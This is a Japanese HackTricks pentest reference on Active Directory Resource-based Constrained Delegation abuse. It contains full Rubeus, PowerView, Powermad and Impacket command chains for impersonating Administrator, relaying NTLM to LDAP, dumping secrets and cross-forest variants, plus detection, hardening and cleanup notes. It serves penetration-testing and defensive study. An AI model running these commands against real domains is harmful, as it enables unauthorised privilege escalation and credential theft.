# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation の基本

Resource-based constrained delegation（RBCD）は[constrained delegation](constrained-delegation.md)に似ていますが、信頼の方向が逆です。従来の constrained delegation では、プリンシパルが委任できるサービスを記録します。一方、RBCD では**対象リソース**に、どのプリンシパルがそのリソースに対してユーザーを偽装できるかを記録します。<sup>[[12]](#references)</sup>

対象オブジェクトの _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 属性には、そのリソースに対して他の ID に代わって動作することを許可されたプリンシパルを示すセキュリティ記述子が格納されます。

もう1つの重要な違いは、**コンピューターアカウントに対する書き込み権限**（`GenericAll`、`GenericWrite`、`WriteDacl`、`WriteProperty`など）を持つプリンシパルは、_**msDS-AllowedToActOnBehalfOfOtherIdentity**_ を設定できる可能性があることです。従来の constrained delegation の構成には、通常、より高い権限を持つ管理アクセスが必要です。<sup>[[1]](#references)</sup>

より正確には、従来の constrained delegation 設定の変更は通常、ドメインコントローラー上の `SeEnableDelegationPrivilege` によって制限されます。この権限は一般に、非常に高い権限を持つ管理者が保持しています。RBCD では判断基準が対象オブジェクトのセキュリティ記述子に移るため、該当するコンピューターオブジェクトのプロパティへの書き込みアクセスがあれば、そのユーザー権限がなくても十分な場合があります。<sup>[[1]](#references)[[2]](#references)</sup>

### 新しい概念

`userAccountControl` の **`TrustedToAuthForDelegation`** フラグは、**S4U2Self** の前提条件として説明されることがよくありますが、それだけでは不十分です。\
SPN を持つサービスプリンシパルは、このフラグがなくても S4U2Self を要求できます。`TrustedToAuthForDelegation` が設定されている場合、返されるサービスチケットは**forwardable**になります。設定されていない場合、通常チケットは**non-forwardable**です。<sup>[[5]](#references)</sup>

従来の constrained delegation は、S4U2Proxy の段階で**non-forwardable な TGS**を拒否します。RBCD では、対象のセキュリティ記述子が要求元サービスを許可していれば、その S4U2Self チケットを受け入れることができます。<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### 攻撃の構造

> **コンピューターアカウント**に対する**書き込み相当の権限**があれば、そのマシンへの特権アクセスを取得できる可能性があります。

攻撃者がすでに**被害者のコンピューターオブジェクトに対する書き込み相当の権限**を持っているとします。

1. 攻撃者は **SPN** を持つアカウント（「Service A」）を**侵害する**か、**作成します**。デフォルトでは、認証済みドメインユーザーは **_MachineAccountQuota_** によって制御される最大10個のコンピューターオブジェクトを作成でき、コンピューターオブジェクトには利用可能な SPN が自動的に付与されます。
2. 攻撃者は、被害者のコンピューター（ServiceB）に対する WRITE 権限を**悪用**し、その被害者のコンピューター（ServiceB）に対して ServiceA が任意のユーザーを偽装できるよう、**resource-based constrained delegation を構成します**。
3. 攻撃者は Rubeus を使い、Service A から Service B に対して、Service B への特権アクセスを持つユーザーを指定した**完全な S4U 攻撃**（S4U2Self と S4U2Proxy）を実行します。
   1. S4U2Self（侵害または作成した SPN アカウントから）：Administrator を Service A に偽装した **TGS を要求**します（non-forwardable）。
   2. S4U2Proxy：その **non-forwardable な TGS** を使って、**被害者ホスト**に対する Administrator を偽装したサービスチケットを要求します。
   3. この RBCD のフローでは、Service A が対象リソースのセキュリティ記述子で許可されているため、non-forwardable チケットでも機能します。
4. 攻撃者は**pass-the-ticket**を行い、ユーザーを**偽装**して**被害者の ServiceB にアクセス**できます。<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` にすると、デフォルトのコンピューター作成経路は閉じられますが、対象コンピューターオブジェクトに対する書き込み権限や、既存アカウントの制御権はなくなりません。SPN を持たない、制御下の一般ユーザーを、委任元プリンシパルとして[SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd)経由で使用できる場合もあります（同一ドメイン内でも可能です）。この経路には、有効な RBCD 書き込み権限、委任元ユーザーの認証情報の制御、委任可能な偽装対象 ID、互換性のある Kerberos 暗号化の動作、アカウントに影響する NT ハッシュの変更が依然として必要です。これらはそれぞれ別の前提条件として扱ってください。RBCD 属性が空であることや quota がゼロであることだけでは、攻撃の成功も安全性も証明できません。

既存の RBCD 記述子には、委任元のコンピューターを直接指定する代わりに**グループ**を指定することもできます。SPN を持つコンピューターアカウントを制御しており、そのグループに追加できる場合、対象コンピューターの RBCD 属性を変更せずに、新しいグループメンバーシップによって委任経路が成立する可能性があります。この経路が機能するか判断する際は、グループの有効なメンバーシップ書き込み ACL（deny ACE を含む）、ネストされたメンバーシップとトークンの更新、記述子の trustee SID、偽装対象アカウントの委任制限、対象サービスの SPN を確認してください。

ドメインの _**MachineAccountQuota**_ を確認するには、次のコマンドを使用します。

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## 攻撃

### コンピューターオブジェクトの作成

**[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> を使って、ドメイン内にコンピューターオブジェクトを作成できます。

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### リソースベースの制約付き委任の設定

**Active Directory PowerShell モジュールを使用する**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**powerviewを使う**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### 完全な S4U attack の実行（Windows/Rubeus）

まず、パスワード `123456` を使って新しい Computer オブジェクトを作成したため、そのパスワードの hash が必要です:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

これにより、そのアカウントのRC4およびAESハッシュが出力されます。\
これで、攻撃を実行できます。<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Rubeusの`/altservice`パラメータを使えば、一度の要求で複数のサービス向けのチケットを生成できます。

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> ユーザーには **「アカウントは機密扱いで、委任できません。」** のフラグを設定できます。このフラグが有効な場合、この委任フローを通じてそのアカウントになりすますことはできません。BloodHound では、分析時にこのプロパティが表示されます。

### Linux ツール: Impacket を使ったエンドツーエンドの RBCD (2024+)

Linux 環境から操作する場合、公式の Impacket ツールを使って RBCD の一連の手順を実行できます:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

注記
- LDAP signing/LDAPS が強制されている場合は、`impacket-rbcd -use-ldaps ...` を使用します。
- AES keys を優先してください。多くの最新ドメインでは RC4 が制限されています。Impacket と Rubeus はどちらも AES-only のフローに対応しています。
- Impacket は一部のツールで `sname`（"AnySPN"）を書き換えられますが、可能な限り正しい SPN を取得してください（例: CIFS/LDAP/HTTP/HOST/MSSQLSvc）。

### SPN を持たない Kerberos-only delegator のための Reflective RBCD

**`msDS-AllowedToDelegateTo` は持つが、SPN も `TrustedToAuthForDelegation` も持たない**侵害済みユーザーは、通常の S4U2Self では [Kerberos-only constrained delegation](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation) に必要な forwardable evidence ticket を生成できません。<sup>[[1]](#references)[[18]](#references)</sup> そのユーザーが自身の AD オブジェクトに RBCD を設定できる場合、攻撃者が制御する SPN を持つアカウントから、まずそのユーザーへ委任できます。<sup>[[1]](#references)[[18]](#references)</sup> この RBCD ホップにより、偽装対象ユーザーの forwardable ticket が SPN を持たないアカウントに発行され、侵害済みアカウントの従来型 delegation allow-list にある SPN への2回目の S4U2Proxy の evidence となります。<sup>[[18]](#references)[[19]](#references)</sup>

SPN を持たない最初のホップでは、helper アカウントの S4U2Proxy リクエストで **U2U** を使用する必要があります。`enc-tkt-in-skey` により、KDC は SPN の key を検索する代わりに、delegator の TGT session key で ticket を暗号化します。<sup>[[18]](#references)[[19]](#references)</sup> また、KDC は `PA-PAC-OPTIONS` 内の RBCD bit、delegator の TGT、および S4U2Self evidence ticket も必要とします。<sup>[[18]](#references)[[20]](#references)</sup> 作者の Impacket `getST.py` fork は、このリクエスト用に `-nospn` と `-tgt` を追加しています。`-nospn`/`-tgt` のサポートは upstream Impacket PR #2324 に含まれているため、この手順で stock `getST.py` が対応していると仮定せず、リンク先の fork を使用してください。<sup>[[18]](#references)[[20]](#references)</sup>

この例では、`svc_web` が侵害され、自身の RBCD 属性を書き換えることができ、`host/dc01.corp.local` への委任が許可されているものとします。また、SPN を持つ helper を作成でき、RC4 が許可されており、選択した `Administrator` が委任可能であることも前提とします。侵害済みアカウントの NT hash を使って **RC4 TGT** を要求します。作者の fork から最初の `getST.py` を実行し、`describeTicket.py` の出力を確認して、その **RC4 TGT session key** を以下に指定します。最後の `getST.py` は stock Impacket を使用できます。NT hash を変更する前に TGT リクエストを実行してください。この変更により、パスワードをリセットするまで service account が機能しなくなります。<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

以下の [SPN-less RBCD route](#spn-less-cross-domain--cross-forest-rbcd) とは異なり、このチェーンでは SPN-less account を **RBCD target、その後 classic KCD delegator** として使います。引き続き、SPN を持つ別の制御下アカウントが必要です。`MachineAccountQuota=0` の場合、新しい computer の代わりに、すでに制御下にある SPN account を使えます。quota が 0 であるだけでは、この経路は防げません。<sup>[[18]](#references)[[19]](#references)</sup>

## クロスドメインおよびクロスフォレスト RBCD

制御下にある **delegating principal** が **resource computer** とは**別のドメイン**（または**別のフォレスト**）に存在する場合でも、悪用手法は **RBCD** ですが、チケットのフローは通常の単一ドメインでの `S4U2Self -> S4U2Proxy` ではなくなります。

### クロスドメイン RBCD: SID を使って外部 principal を設定する

**別のドメイン**から `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定する場合、外部の machine/user が、ターゲットドメインの LDAP で**名前解決できない**ことがあります。その場合、sAMAccountName/UPN ではなく、外部 principal の **SID** を使って delegation entry を設定します。

これは、`ntlmrelayx.py` で NTLM を LDAP に relay する場合に特に重要です。<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Notes:
- `--sid` は、委任アカウントがターゲットドメインの外部にある場合に必要となるため、`ntlmrelayx.py` に `--escalate-user` を SID として扱うよう指示します。
- ツールに `User not found in LDAP` と表示されても、セキュリティ記述子には外部 SID が直接格納されるため、委任の書き込みは成功することがあります。

### クロスドメイン RBCD: cross-realm S4U シーケンス

外部プリンシパルが `msDS-AllowedToActOnBehalfOfOtherIdentity` に追加されたら、動作するクロスドメインのフローは次のとおりです。<sup>[[9]](#references)[[13]](#references)</sup>

1. 委任プリンシパル自身のドメインから、そのプリンシパルの **TGT** を取得します。
2. `krbtgt/<target-domain>` の **referral TGT** を要求します。
3. ターゲットドメインの DC で、偽装するユーザーの **cross-realm S4U2Self referral** を要求します。
4. 委任元ドメインで、そのユーザーの実際の **S4U2Self** チケットを要求します。
5. 委任元ドメインで **S4U2Proxy** を実行し、ターゲットドメイン向けの referral ticket を取得します。
6. ターゲットドメインの DC で最後の **S4U2Proxy** を実行し、`cifs/host.target`、`host/host.target` などのサービスチケットを取得します。

このため、標準的な Linux ツールではクロスドメイン RBCD が失敗することがよくあります。<sup>[[9]](#references)</sup>
- `TGS-REQ` で使用する TGT の realm と、リクエストの **realm** が異なる必要がある場合があります。
- このチェーンでは、**S4U2Proxy を個別に複数回実行**する必要があります。`S4U2Self` のみ、または `S4U2Self` の直後に `S4U2Proxy` を1回実行するだけでは不十分です。

### Linux からのクロスドメイン RBCD

Synacktiv は、2つの KDC を明示的に処理することで Linux から cross-realm シーケンスを再現する、Impacket の `getST.py` 実装を公開しました。<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

実際の運用では、新しい引数は次のとおりです。
- `-dc-ip`: **委任元**ドメインの DC
- `-targetdomain`: **リソースコンピューター**のドメイン
- `-targetdc`: **リソース**ドメインの DC

### クロスフォレスト RBCD の制限

クロスフォレスト RBCD には重要な制限があります。**偽装するユーザーは、委任元プリンシパルと同じフォレストに属している必要があります**。つまり、制御下のマシンアカウントが `valhalla.local` にあり、ターゲットリソースが `asgard.local` にある場合、通常、RBCD を使って任意の `asgard.local` ユーザーをそのリソースに対して偽装することは**できません**。<sup>[[9]](#references)</sup>

次の場合には、引き続き悪用できます。
- **委任元フォレスト**のユーザーが、他方のフォレストにあるリソースホストの**ローカル管理者**（またはその他の特権ユーザー）である
- 信頼関係によって必要な認証経路が許可され、ターゲットコンピューターのセキュリティ記述子で外部 SID が受け入れられる

### クロスフォレスト RBCD のプロトコル上の注意点

クロスフォレスト RBCD は単なる「信頼関係のあるクロスドメイン」ではありません。確認されているフローには、従来の一般的なツールが見落としがちな、次の 2 つの注意点があります。<sup>[[9]](#references)</sup>

1. **`PA-PAC-OPTIONS=branch-aware`** を設定する追加の **S4U2Proxy** リクエスト
2. 他の etype を要求していても、最終的なサービスチケットが **RC4** で返される場合がある

実際のフローは次のとおりです。

1. フォレスト A の委任元プリンシパルの TGT を取得する。
2. フォレスト A で、偽装するユーザーの **S4U2Self** を要求する。
3. フォレスト A で **S4U2Proxy** を要求し、フォレスト B の referral TGT を取得する。
4. フォレスト A で、S4U2Self チケットを追加チケットとして指定せず、`branch-aware` を有効にして 2 回目の **S4U2Proxy** を送信し、フォレスト B の別の referral TGT を取得する。
5. 必要に応じて、フォレスト B で委任元プリンシパルの通常のサービスチケットを要求する（最終的な悪用にはこのチケットは不要）。
6. 手順 3 と 4 で取得した referral ticket を使い、フォレスト B で、偽装するフォレスト A のユーザーからターゲット SPN への最終的な **S4U2Proxy** チケットを要求する。

### Linux からのクロスフォレスト RBCD

同じ Synacktiv Impacket ブランチでは、このロジック用に `-forest` スイッチが追加されています。<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### 再帰的なマルチドメイン RBCD（3 つ以上のドメイン）

**マルチドメインフォレスト**では、**S4U2Self** と **S4U2Proxy** は 1 回の referral で停止せず、**再帰的に**実行できます。

- **再帰的な S4U2Self**: 最初の `S4U2Self` は **偽装対象ユーザーのドメイン**に送信されます。通常の `TGS-REQ` referral で `krbtgt/<REALM>` を要求しながら、中間の親子ドメイン間のホップをたどり、**最後の `S4U2Self`** は **委任を行うプリンシパル自身のドメイン**に送信されます。
- つまり、**マシンアカウントの TGT を持っているだけ**で、同じフォレスト内の別ドメインの **管理者を偽装**し、`cifs/host`、`host/host`、`wsman/host` などを要求できる場合があります。
- **再帰的な S4U2Proxy** も同様に信頼チェーンをたどります。中間ホップでは、次の `krbtgt/<REALM>` referral を要求する際に、直前のチケットを TGT として再利用し、最後のホップでのみ最終的なサービスチケットが返されます。<sup>[[10]](#references)</sup>

実際の同一フォレストの例を示します。

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPNなしのクロスドメイン / クロスフォレストRBCD

**委任元プリンシパルがSPNを持たないユーザーの場合**、最後の再帰的な`S4U2Self`は**`KDC_ERR_S_PRINCIPAL_UNKNOWN`**で失敗します。回避策は、**最後のホップのみ`S4U2Self+U2U`として再試行する**ことです。<sup>[[10]](#references)</sup>

悪用チェーンの概要：

1. **NT hash**で認証し、KDCが**RC4-HMAC (etype 23)**を優先するようにします。
2. まず**`-self -u2u`**を要求し、そのticketを後続のproxy手順用のticketとは別に保管します。
3. `describeTicket.py`で**TGT session key**を抽出します。
4. `changepasswd.py -newhashes <session_key>`を使って、ユーザーの**NT hash**をその**session key**に置き換えます。
5. `S4U2Self+U2U` ticketを、別途実行する**`-proxy`**リクエストの**`-additional-ticket`**として再利用します。

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

運用上の注意点:

- **最初の信頼済みホップがすでに別のフォレストにある場合**は、Windows のネイティブ動作に合わせるため、**branch-aware** アルゴリズム（`getST.py ... -forest`）を優先してください。チェーンの後半で初めて外部フォレストに到達する場合は、branch-aware ではない再帰フローでも機能する可能性があります。<sup>[[9]](#references)</sup>
- 最近の **Windows Server 2022/2025** DC では、RC4 の廃止により、RC4 を強制すると **`KDC_ERR_ETYPE_NOSUPP`** で失敗することがあります。このため、従来の SPN ベースの RBCD は AES で動作しても、**SPN-less RBCD** は実行できない場合があります。<sup>[[15]](#references)</sup>
- ユーザーの hash/password を変更する前に **`S4U2Self+U2U`** を実行してください。`SamrChangePasswordUser` はアカウントの Kerberos AES keys を再計算しないため、先にパスワードを変更すると、後続のチケット要求に支障が出る可能性があります。<sup>[[14]](#references)</sup>
- なりすまし対象のアカウントは、引き続き**委任可能**である必要があります。**Protected Users** と **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** が設定されたアカウントは、チェーンをブロックします。

## 検知 / ハードニングに関する注意点

- ドメイン/フォレストをまたぐ RBCD の経路は、通常、**ACL abuse** または **relay-to-LDAP** によって作成されます。DC で **LDAP signing** と **LDAP channel binding** を強制し、一般的な設定経路を遮断してください。
- コンピューターオブジェクトの `msDS-AllowedToActOnBehalfOfOtherIdentity` に書き込み可能なユーザーを監査し、保存された SID（**foreign security principals** を含む）を解決してください。
- 信頼関係の多い環境では、**Selective Authentication**、**SID filtering**、外部フォレストのユーザーがリソースホストで **local admin** 権限を持っているかどうかを確認してください。

### アクセス

最後のコマンドラインは **S4U attack** を完全に実行し、Administrator から victim host への **TGS** をメモリ内に **inject** します。\
この例では Administrator から **CIFS** サービスの TGS を要求しているため、**C$** にアクセスできます:

```bash
ls \\victim.domain.local\C$
```

### 異なる service ticket を悪用する

[**利用可能な service ticket はこちら**](silver-ticket.md#available-services)を参照してください。

## 列挙、監査、クリーンアップ

### RBCD が設定されたコンピューターを列挙する

PowerShell（SD をデコードして SID を解決する）：

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket（1つのコマンドで読み取りまたはフラッシュ）:

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### RBCDのクリーンアップ / リセット

- PowerShell（属性をクリア）：

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: Kerberos が DES または RC4 を使用しないように設定されており、RC4 hash のみを指定していることを意味します。Rubeus には少なくとも AES256 hash を指定してください（または rc4、aes128、aes256 の hash をすべて指定してください）。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- 通常のユーザーに対する `-self` 実行時の **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: 委任元の principal に **SPN がない**可能性があります。通常の `S4U2Self` ではなく、**`S4U2Self+U2U`** を使って **最後の hop** を再試行してください。<sup>[[10]](#references)</sup>
- **SPN-less RBCD** 実行時の **`KDC_ERR_ETYPE_NOSUPP`**: 最近の DC では、`S4U2Self+U2U` と session-key-substitution の手法に必要な、強制的な **RC4-HMAC** の経路が拒否される場合があります。代わりに、AES を使う従来の **SPN-backed** RBCD の経路を試してください。<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: 現在のコンピューターと DC の時刻が異なり、Kerberos が正常に動作していないことを意味します。
- **`preauth_failed`**: 指定した username と hash ではログインできないことを意味します。hash の生成時に username 内の「$」を忘れている可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）
- S4U2Proxy 実行時の **`KDC_ERR_BADOPTION`**: 偽装するアカウントの委任制限、evidence ticket の forwardable フラグ、および classic KCD または対象の RBCD descriptor がこの hop を許可しているかを確認してください。これは **KDC の委任ポリシーエラー**であり、対象サービスが稼働しているか、ユーザーがアプリケーションレベルのアクセス権を持つかを示すものではありません。未登録の対象 SPN では、通常 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** が発生します。<sup>[[21]](#references)[[22]](#references)</sup>

## Notes, relays and alternatives

- LDAP がフィルタリングされている場合、AD Web Services (ADWS) 経由で RBCD SD を書き込むこともできます。参照:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chain は、1ステップでローカル SYSTEM を取得するために RBCD で終わることがよくあります。実践的なエンドツーエンドの例:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding が **無効**で、machine account を作成できる場合、**KrbRelayUp** などのツールを使って、強制した Kerberos auth を LDAP に relay し、対象コンピューターオブジェクト上で自分の machine account に対する `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定して、ホスト外から S4U 経由で **Administrator** を即座に偽装できます。<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog: Active Directory を攻撃するための Resource-Based Constrained Delegation の悪用](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Delegation に関する補足 – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: コンピューターオブジェクトの乗っ取り](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation の悪用](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: 攻撃者視点の Kerberos 概要](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py（公式）](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [最近の syntax を含む Linux 用クイックチートシート](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno（LDAP signing 無効 → Kerberos relay から RBCD）](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - cross-domain および cross-forest RBCD の調査](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - cross-domain および cross-forest RBCD の調査: パート 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation の概要](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kerberos での RC4 使用の検出と修復](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy の詳細](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
- [17] [James Forshaw - 通常のユーザーアカウントを使った RBCD の悪用](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade - SPN-less アカウントに対する Protocol Transition を使わない Constrained Delegation の悪用](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
- [19] [Sprocket Security - SPN-less アカウントに対する Protocol Transition を使わない Constrained Delegation の悪用](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Impacket PR #2324 - U2U を使った S4U2Proxy](https://github.com/fortra/impacket/pull/2324)
